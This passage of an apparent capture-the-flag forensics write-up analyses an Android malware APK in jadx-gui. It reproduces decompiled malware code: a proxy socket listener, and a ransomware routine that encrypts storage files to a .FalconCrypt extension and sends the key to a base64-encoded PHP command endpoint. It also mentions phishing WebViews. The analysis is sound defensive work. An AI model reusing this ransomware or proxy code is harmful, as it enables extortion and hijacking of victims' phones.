<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">android</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">Activity</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">onResume</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">super</span><span class="o">.</span><span class="n">onResume</span><span class="p">();</span>
<span class="w">        </span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>This <code>uaBtYrqgwpi</code> class uses WebView do display fake sites personalized to the vitcim's phone model. It also prompts to disable security features.</p>
<p>I will use the class name as my answer to question 11.</p>
<p><img alt="task12" src="../images/Anpu/task12.png" /></p>
<h1>Task 13</h1>
<p>Set.xml contains information pointing towards the malware using websockets. In Android, there are two classes responsible for creating listening sockets. <code>LocalServerSocket</code> and <code>ServerSocket</code></p>
<p>The key Difference between them is that LocalServerSocket uses a string name and is invisible to the network, while ServerSocket uses a numerical port and can be network-accessible.</p>
<p>I searched for ServerSocket and got back some matches.</p>
<p><img alt="search" src="../images/Anpu/search.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nx">SNIP</span><span class="p">&gt;</span>

<span class="w">    </span><span class="kd">class</span><span class="w"> </span><span class="nx">p0prUw0vSWgOVKCc</span><span class="w"> </span><span class="nx">implements</span><span class="w"> </span><span class="nx">Runnable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">p0prUw0vSWgOVKCc</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="err">@</span><span class="nx">Override</span><span class="w"> </span><span class="c1">// java.lang.Runnable</span>
<span class="w">        </span><span class="nx">public</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="nx">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">ServerSocket</span><span class="w"> </span><span class="nx">serverSocket</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">ServerSocket</span><span class="p">(</span><span class="mi">34500</span><span class="p">);</span>
<span class="w">                </span><span class="nx">toBZBPVgokcOmqoY</span><span class="p">.</span><span class="nx">this</span><span class="p">.</span><span class="nx">f987GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nx">DteN3ovpuVMACQRy</span><span class="p">(</span><span class="s">&quot;ProxyServer&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Port=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">serverSocket</span><span class="p">.</span><span class="nx">getLocalPort</span><span class="p">());</span>
<span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">new</span><span class="w"> </span><span class="nx">Thread</span><span class="p">(</span><span class="nx">new</span><span class="w"> </span><span class="nx">bdlxtspya</span><span class="p">.</span><span class="nx">heihqyeizynsrdfg</span><span class="p">.</span><span class="nx">tpqlhhugp</span><span class="p">.</span><span class="nx">fdcravxkaaiztf</span><span class="p">.</span><span class="nx">p0prUw0vSWgOVKCc</span><span class="p">(</span><span class="nx">serverSocket</span><span class="p">.</span><span class="nx">accept</span><span class="p">())).</span><span class="nx">start</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="nx">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">Exception</span><span class="w"> </span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">toBZBPVgokcOmqoY</span><span class="p">.</span><span class="nx">this</span><span class="p">.</span><span class="nx">f987GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nx">DteN3ovpuVMACQRy</span><span class="p">(</span><span class="s">&quot;PORTERROR&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ERROR&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="nx">e</span><span class="p">.</span><span class="nx">printStackTrace</span><span class="p">();</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">&lt;</span><span class="nx">SNIP</span><span class="p">&gt;</span>
</code></pre></div>

<p>That value in brackets on the 8th line corresponds to the port number, which will be my answer to question 13.</p>
<p><img alt="task13" src="../images/Anpu/task13.png" /></p>
<h1>Task 14</h1>
<p>Still in jadx-gui, I searched for the string <code>crypt</code>. This way, I should see everything relation to encryption and decryption, unless obfuscated.</p>
<p><img alt="crypto" src="../images/Anpu/crypto.png" /></p>
<p>I see a few cryptocurrencies mentioned, and something that looks like a file extension <code>.FalconCrypt</code></p>
<p>I clicked on the mentioned result and found the malware's encryption functionality.</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="nt">SNIP</span><span class="o">&gt;</span>

<span class="w">    </span><span class="nt">protected</span><span class="w"> </span><span class="nt">void</span><span class="w"> </span><span class="nt">onHandleIntent</span><span class="o">(</span><span class="nt">Intent</span><span class="w"> </span><span class="nt">intent</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc.p0prUw0vSWgOVKCc</span><span class="w"> </span><span class="err">p0pruw0vswgovkcc</span><span class="p">;</span>
<span class="w">        </span><span class="err">String</span><span class="w"> </span><span class="err">str</span><span class="p">;</span>
<span class="w">        </span><span class="err">this.f1020G9IIDoU5BG6kP9ak</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.gq2BJNmFUzQWsFww(this,</span><span class="w"> </span><span class="err">&quot;status&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">this.crt0auXnG4Wbo6f1</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.gq2BJNmFUzQWsFww(this,</span><span class="w"> </span><span class="err">&quot;key&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">File</span><span class="w"> </span><span class="err">file</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">File(&quot;/mnt&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">File</span><span class="w"> </span><span class="err">file2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">File(&quot;/mount&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">File</span><span class="w"> </span><span class="err">file3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">File(&quot;/sdcard&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">File</span><span class="w"> </span><span class="err">file4</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">File(&quot;/storage&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="err">try</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;1&quot;)</span><span class="p">;</span>
<span class="w">            </span><span class="err">p0prUw0vSWgOVKCc(Environment.getExternalStorageDirectory())</span><span class="p">;</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;2&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">p0prUw0vSWgOVKCc(file)</span><span class="p">;</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;3&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused2</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">p0prUw0vSWgOVKCc(file2)</span><span class="p">;</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;4&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused3</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">p0prUw0vSWgOVKCc(file3)</span><span class="p">;</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;5&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused4</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">p0prUw0vSWgOVKCc(file4)</span><span class="p">;</span>
<span class="w">            </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.DteN3ovpuVMACQRy(&quot;Cryptolocker&quot;,</span><span class="w"> </span><span class="err">&quot;6&quot;)</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused5</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nt">if</span><span class="w"> </span><span class="o">(!</span><span class="nt">this</span><span class="p">.</span><span class="nc">f1020G9IIDoU5BG6kP9ak</span><span class="p">.</span><span class="nc">equals</span><span class="o">(</span><span class="s2">&quot;crypt&quot;</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">if</span><span class="w"> </span><span class="err">(this.f1020G9IIDoU5BG6kP9ak.equals(&quot;decrypt&quot;))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="err">List&lt;String&gt;</span><span class="w"> </span><span class="err">listI</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc.p0prUw0vSWgOVKCc.I(this.f1021GHqqn0pC2O2VWOBi.S(this.f1021GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc(this)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">&quot;|File</span><span class="w"> </span><span class="err">System</span><span class="w"> </span><span class="err">is</span><span class="w"> </span><span class="err">Decrypted!|&quot;))</span><span class="p">;</span>
<span class="w">                </span><span class="err">String</span><span class="w"> </span><span class="err">strL9LZsGC5d6FeXPNu</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc.p0prUw0vSWgOVKCc.l9LZsGC5d6FeXPNu(listI.get(0))</span><span class="p">;</span>
<span class="w">                </span><span class="err">String</span><span class="w"> </span><span class="err">strL9LZsGC5d6FeXPNu2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc.p0prUw0vSWgOVKCc.l9LZsGC5d6FeXPNu(listI.get(1))</span><span class="p">;</span>
<span class="w">                </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.gV5dQHrmcusXPx8c(this,</span><span class="w"> </span><span class="err">&quot;L3FTbHdhWS9uU2lBSHMvVFJPZHR0LnBocA==&quot;,</span><span class="w"> </span><span class="err">&quot;q=&quot;</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">strL9LZsGC5d6FeXPNu2,</span><span class="w"> </span><span class="err">&quot;&amp;p=&quot;</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">strL9LZsGC5d6FeXPNu,</span><span class="w"> </span><span class="err">&quot;&amp;t=Kt5APrM5WULt4dnqwMvFjszgjcBqfS&quot;)</span><span class="p">;</span>
<span class="w">                </span><span class="err">p0pruw0vswgovkcc</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.f1021GHqqn0pC2O2VWOBi</span><span class="p">;</span>
<span class="w">                </span><span class="err">str</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">&quot;false&quot;</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">tmChcFLUGbiMMnVw</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;status&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">);</span>
<span class="w">            </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">tmChcFLUGbiMMnVw</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;key&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">);</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">        </span><span class="nt">List</span><span class="o">&lt;</span><span class="nt">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">listI2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">bdlxtspya</span><span class="p">.</span><span class="nc">heihqyeizynsrdfg</span><span class="p">.</span><span class="nc">tpqlhhugp</span><span class="p">.</span><span class="nc">GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">I</span><span class="o">(</span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">S</span><span class="o">(</span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="o">(</span><span class="nt">this</span><span class="o">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;|The Cryptor is activated, the file system is encrypted by key: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">this</span><span class="p">.</span><span class="nc">crt0auXnG4Wbo6f1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;|&quot;</span><span class="o">));</span>
<span class="w">        </span><span class="nt">String</span><span class="w"> </span><span class="nt">strL9LZsGC5d6FeXPNu3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">bdlxtspya</span><span class="p">.</span><span class="nc">heihqyeizynsrdfg</span><span class="p">.</span><span class="nc">tpqlhhugp</span><span class="p">.</span><span class="nc">GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">l9LZsGC5d6FeXPNu</span><span class="o">(</span><span class="nt">listI2</span><span class="p">.</span><span class="nc">get</span><span class="o">(</span><span class="nt">0</span><span class="o">));</span>
<span class="w">        </span><span class="nt">String</span><span class="w"> </span><span class="nt">strL9LZsGC5d6FeXPNu4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">bdlxtspya</span><span class="p">.</span><span class="nc">heihqyeizynsrdfg</span><span class="p">.</span><span class="nc">tpqlhhugp</span><span class="p">.</span><span class="nc">GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">p0prUw0vSWgOVKCc</span><span class="p">.</span><span class="nc">l9LZsGC5d6FeXPNu</span><span class="o">(</span><span class="nt">listI2</span><span class="p">.</span><span class="nc">get</span><span class="o">(</span><span class="nt">1</span><span class="o">));</span>
<span class="w">        </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">gV5dQHrmcusXPx8c</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;L3FTbHdhWS9uU2lBSHMvVFJPZHR0LnBocA==&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;q=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">strL9LZsGC5d6FeXPNu4</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&amp;p=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">strL9LZsGC5d6FeXPNu3</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&amp;t=Kt5APrM5WULt4dnqwMvFjszgjcBqfS&quot;</span><span class="o">);</span>
<span class="w">        </span><span class="nt">p0pruw0vswgovkcc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="o">;</span>
<span class="w">        </span><span class="nt">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;true&quot;</span><span class="o">;</span>
<span class="w">        </span><span class="nt">p0pruw0vswgovkcc</span><span class="p">.</span><span class="nc">tmChcFLUGbiMMnVw</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;cryptfile&quot;</span><span class="o">,</span><span class="w"> </span><span class="nt">str</span><span class="o">);</span>
<span class="w">        </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">tmChcFLUGbiMMnVw</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;status&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">);</span>
<span class="w">        </span><span class="nt">this</span><span class="p">.</span><span class="nc">f1021GHqqn0pC2O2VWOBi</span><span class="p">.</span><span class="nc">tmChcFLUGbiMMnVw</span><span class="o">(</span><span class="nt">this</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;key&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">);</span>
<span class="w">    </span><span class="err">}</span>

<span class="w">    </span><span class="nt">void</span><span class="w"> </span><span class="nt">p0prUw0vSWgOVKCc</span><span class="o">(</span><span class="nt">File</span><span class="w"> </span><span class="nt">file</span><span class="o">)</span><span class="w"> </span><span class="nt">throws</span><span class="w"> </span><span class="nt">IOException</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">FileOutputStream</span><span class="w"> </span><span class="err">fileOutputStream</span><span class="p">;</span>
<span class="w">        </span><span class="err">try</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="err">for</span><span class="w"> </span><span class="err">(File</span><span class="w"> </span><span class="n">file2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">file</span><span class="o">.</span><span class="nf">listFiles</span><span class="p">())</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="n">if</span><span class="w"> </span><span class="p">(</span><span class="n">file2</span><span class="o">.</span><span class="nf">isDirectory</span><span class="p">())</span><span class="w"> </span><span class="err">{</span>
<span class="w">                    </span><span class="nf">GHqqn0pC2O2VWOBi</span><span class="p">(</span><span class="n">file2</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">file2</span><span class="p">.</span><span class="nc">isFile</span><span class="o">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="err">try</span><span class="w"> </span><span class="err">{</span>
<span class="w">                        </span><span class="err">byte</span><span class="cp">[]</span><span class="w"> </span><span class="err">bArrA</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.GHqqn0pC2O2VWOBi.p0prUw0vSWgOVKCc.p0prUw0vSWgOVKCc.A(file2)</span><span class="p">;</span>
<span class="w">                        </span><span class="err">if</span><span class="w"> </span><span class="err">(this.f1020G9IIDoU5BG6kP9ak.equals(&quot;crypt&quot;))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                            </span><span class="err">if</span><span class="w"> </span><span class="err">(!file2.getPath().contains(&quot;.FalconCrypt&quot;))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                                </span><span class="err">byte</span><span class="cp">[]</span><span class="w"> </span><span class="err">bArrRsWIC9mSoVHuo238</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.rsWIC9mSoVHuo238(bArrA,</span><span class="w"> </span><span class="err">this.crt0auXnG4Wbo6f1)</span><span class="p">;</span>
<span class="w">                                </span><span class="err">fileOutputStream</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">FileOutputStream(file2.getPath()</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">&quot;.FalconCrypt&quot;,</span><span class="w"> </span><span class="err">true)</span><span class="p">;</span>
<span class="w">                                </span><span class="err">fileOutputStream.write(bArrRsWIC9mSoVHuo238)</span><span class="p">;</span>
<span class="w">                                </span><span class="err">fileOutputStream.close()</span><span class="p">;</span>
<span class="w">                                </span><span class="err">file2.delete()</span><span class="p">;</span>
<span class="w">                            </span><span class="p">}</span>
<span class="w">                        </span><span class="err">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">this</span><span class="p">.</span><span class="nc">f1020G9IIDoU5BG6kP9ak</span><span class="p">.</span><span class="nc">equals</span><span class="o">(</span><span class="s2">&quot;decrypt&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nt">file2</span><span class="p">.</span><span class="nc">getPath</span><span class="o">()</span><span class="p">.</span><span class="nc">contains</span><span class="o">(</span><span class="s2">&quot;.FalconCrypt&quot;</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="err">byte</span><span class="cp">[]</span><span class="w"> </span><span class="err">bArrBvzvvRrFEB1uRvgd</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">this.f1021GHqqn0pC2O2VWOBi.BvzvvRrFEB1uRvgd(bArrA,</span><span class="w"> </span><span class="err">this.crt0auXnG4Wbo6f1)</span><span class="p">;</span>
<span class="w">                            </span><span class="err">fileOutputStream</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">FileOutputStream(file2.getPath().replace(&quot;.FalconCrypt&quot;,</span><span class="w"> </span><span class="err">&quot;&quot;),</span><span class="w"> </span><span class="err">true)</span><span class="p">;</span>
<span class="w">                            </span><span class="err">fileOutputStream.write(bArrBvzvvRrFEB1uRvgd)</span><span class="p">;</span>
<span class="w">                            </span><span class="err">fileOutputStream.close()</span><span class="p">;</span>
<span class="w">                            </span><span class="err">file2.delete()</span><span class="p">;</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="err">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="err">}</span>
<span class="w">            </span><span class="err">}</span>
<span class="w">        </span><span class="err">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">Exception</span><span class="w"> </span><span class="nt">unused2</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>
</code></pre></div>

<p>It looks through the mount, sdcard, storage, and mnt directories in order to find files to encrypt. It then uses a key to do so, and leaves the files in an encrypted format with a .FalconCrypt extension.</p>
<p>The extension will be my answer to question 14.</p>
<p><img alt="task14" src="../images/Anpu/task14.png" /></p>
<h1>Task 15</h1>
<p><img alt="above" src="../images/Anpu/above.png" /></p>
<p>Above the FalconCrypt mention, there was a base64 encoded line.</p>
<p><img alt="decode" src="../images/Anpu/decode.png" /></p>
<p>After decoding, an endpoint leading to a .php file is uncovered. I'll use it as my answer to question 15.</p>
<p><img alt="task15" src="../images/Anpu/task15.png" /></p>
<h1>Task 16</h1>
<p>I sent the .apk file to Virustotal in order to get more information about it.</p>
<p><img alt="details" src="../images/Anpu/details.png" /></p>
<p>In the details tab, I can see the timestamp of the malware's first sighting in the wild. I will use it as my answer to question 16.</p>
<p><img alt="task16" src="../images/Anpu/task16.png" /></p>
<p>Solved!</p>
            </div>
            
            <div class="toc-sidebar">
                <h3>Contents</h3>
                <ul id="toc-list">
                    <!-- This will be populated by JavaScript -->
                </ul>
            </div>
        </div>
    </main>
    
    <!-- Mobile TOC toggle button -->
    <button class="toc-toggle" aria-label="Toggle table of contents">
        
    </button>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
        </div>
    </footer>

    <!-- Include the Markdown parser (not needed for static HTML) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
    
    <script>
        // Sherlock metadata for sidebar population
        let sherlockData = {};
        
        // Function to initialize the application
        async function initializeApp() {
            try {
                // Fetch sherlock metadata
                const response = await fetch('../sherlocks.json');
                if (!response.ok) {
                    throw new Error('Failed to load sherlock metadata');
                }
                sherlockData = await response.json();
                
                // Populate the sidebar with sherlock links
                populateSidebar();
                
                // Generate table of contents
                generateTableOfContents();
            } catch (error) {
                console.error('Initialization error:', error);
                showError("Failed to initialize application. Please refresh and try again.");
            }
        }

        // Call the initialization function when the page loads
        document.addEventListener('DOMContentLoaded', initializeApp);

        // Populate sidebar with sherlock links dynamically
        function populateSidebar() {
            const categories = {
                "veasy": document.getElementById("veasy-sherlocks"),
                "easy": document.getElementById("easy-sherlocks"),
                "medium": document.getElementById("medium-sherlocks"),
                "hard": document.getElementById("hard-sherlocks"),
                "insane": document.getElementById("insane-sherlocks")
            };

            // Clear existing links
            for (const category of Object.values(categories)) {
                category.innerHTML = '';
            }

            // Add sherlock links to appropriate categories
            for (const [sherlockName, data] of Object.entries(sherlockData)) {
                const difficulty = data.difficulty.toLowerCase();
                if (categories[difficulty]) {
                    const link = document.createElement('a');
                    link.href = `../sherlocks/${sherlockName}.html`;
                    link.textContent = data.title;
                    
                    // Highlight current sherlock
                    if (data.title === "Anpu") {
                        link.classList.add('active');
                    }
                    
                    categories[difficulty].appendChild(link);
                }
            }
        }

        // Generate table of contents from headings
        function generateTableOfContents() {
            const writeupBody = document.querySelector('.writeup-body');
            const tocList = document.getElementById('toc-list');
            const headings = writeupBody.querySelectorAll('h1, h2, h3');
            
            // Clear existing TOC
            tocList.innerHTML = '';
            
            headings.forEach((heading, index) => {
                // Create an ID for the heading if it doesn't have one
                if (!heading.id) {
                    // Convert heading text to kebab-case for ID
                    const headingText = heading.textContent.trim();
                    const headingId = headingText
                        .toLowerCase()
                        .replace(/[^\w\s-]/g, '')
                        .replace(/\s+/g, '-');
                    
                    heading.id = headingId || `section-${index}`;
                }
                
                // Create a list item for the TOC
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.href = `#${heading.id}`;
                link.textContent = heading.textContent;
                
                // Add a class for h2 elements to create indentation
                if (heading.tagName === 'H2') {
                    listItem.classList.add('sub-heading');
                    listItem.style.paddingLeft = '15px';
                } else if (heading.tagName === 'H3') {
                    listItem.classList.add('sub-sub-heading');
                    listItem.style.paddingLeft = '30px';
                }
                
                listItem.appendChild(link);
                tocList.appendChild(listItem);
            });
            
            // Set up scroll highlighting
            setupScrollHighlighting();
        }

        // Highlight active TOC section on scroll
        function setupScrollHighlighting() {
            const tocLinks = document.querySelectorAll('.toc-sidebar a');
            
            function highlightActiveSection() {
                // Find which section is currently in view
